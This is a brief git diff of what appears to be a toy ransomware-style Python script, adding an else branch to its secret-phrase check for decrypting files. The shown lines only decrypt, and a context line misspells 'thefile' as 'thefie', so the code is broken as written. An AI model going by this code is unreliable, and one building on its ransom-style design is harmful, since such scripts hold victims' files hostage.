@@ -24,3 +24,6 @@ if user_phase == secretphrase:
     with open(file,'wb') as thefile:
       thefie.write(contents_decrypted)
     print("Your files are decrypted..!")
+    
+else:
+  print("Dont play with me.. Enter the correct secret phase..")
